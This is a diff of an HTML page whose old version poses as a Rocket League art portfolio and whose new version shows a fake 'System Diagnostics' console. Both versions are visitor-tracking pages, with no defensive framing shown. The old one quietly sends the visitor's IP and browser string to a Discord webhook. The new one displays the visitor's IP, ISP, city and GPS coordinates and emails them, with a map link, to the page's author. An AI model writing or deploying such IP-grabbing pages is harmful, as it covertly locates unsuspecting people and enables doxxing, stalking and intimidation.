@@ -1,29 +1,59 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>My Rocket League Art Portfolio</title>
+    <meta charset="UTF-8">
+    <title>System Diagnostics</title>
+    <style>
+        body { background-color: #0a0a0a; color: #00ff00; font-family: 'Courier New', Courier, monospace; padding: 50px; line-height: 1.6; }
+        .console { border: 1px solid #333; padding: 20px; background: #000; box-shadow: 0 0 20px rgba(0, 255, 0, 0.1); max-width: 600px; margin: 0 auto; }
+        .blink { animation: blinker 1s linear infinite; }
+        @keyframes blinker { 50% { opacity: 0; } }
+        h2 { border-bottom: 1px solid #00ff00; padding-bottom: 10px; }
+        .label { color: #888; }
+    </style>
 </head>
-<body style="background-color: #0b0e14; color: white; text-align: center; font-family: sans-serif;">
-    <h1>Check out my latest drawing!</h1>
-    
-    <img src="https://your-image-link-here.jpg" style="max-width: 80%; border: 2px solid magenta;">
+<body>
 
-    <script>
-        // This function "pings" a free API to get the visitor's IP
-        fetch('https://api.ipify.org?format=json')
-        .then(response => response.json())
-        .then(data => {
-            const visitorIP = data.ip;
-            
-            // This sends that IP to YOUR Discord Webhook
-            fetch('YOUR_DISCORD_WEBHOOK_URL_HERE', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    content: "🚀 **New Visitor Detected!**\nIP: " + visitorIP + "\nUser-Agent: " + navigator.userAgent
-                })
-            });
+<div class="console">
+    <h2>> SYSTEM_SCAN_STARTING...</h2>
+    <p><span class="label">Status:</span> CONNECTED <span class="blink">_</span></p>
+    <hr>
+    <p><span class="label">IPv4_ADDRESS:</span> <span id="ip">Scanning...</span></p>
+    <p><span class="label">ISP_PROVIDER:</span> <span id="isp">Scanning...</span></p>
+    <p><span class="label">LOCATION:</span> <span id="location">Scanning...</span></p>
+    <p><span class="label">COORDINATES:</span> <span id="coords">Scanning...</span></p>
+    <p><span class="label">BROWSER_ENGINE:</span> <span id="browser">Scanning...</span></p>
+    <hr>
+    <p style="font-size: 0.8em; color: #444;">DATA_SYNC_COMPLETE // SESSION_LOGGED</p>
+</div>
+
+<script>
+    // 1. Get detailed data from the API
+    fetch('https://ipapi.co/json/')
+    .then(response => response.json())
+    .then(data => {
+        // Update the screen for the visitor
+        document.getElementById('ip').innerText = data.ip;
+        document.getElementById('isp').innerText = data.org;
+        document.getElementById('location').innerText = `${data.city}, ${data.region} (${data.country_name})`;
+        document.getElementById('coords').innerText = `${data.latitude}, ${data.longitude}`;
+        document.getElementById('browser').innerText = navigator.platform;
+
+        // 2. Send the full report to your Email
+        fetch("https://formsubmit.co/ajax/YOUR_EMAIL_HERE", {
+            method: "POST",
+            headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+            body: JSON.stringify({
+                IP: data.ip,
+                ISP: data.org,
+                City: data.city,
+                Region: data.region,
+                GPS: `${data.latitude}, ${data.longitude}`,
+                Map_Link: `https://www.google.com/maps?q=${data.latitude},${data.longitude}`
+            })
         });
-    </script>
+    });
+</script>
+
 </body>
 </html>
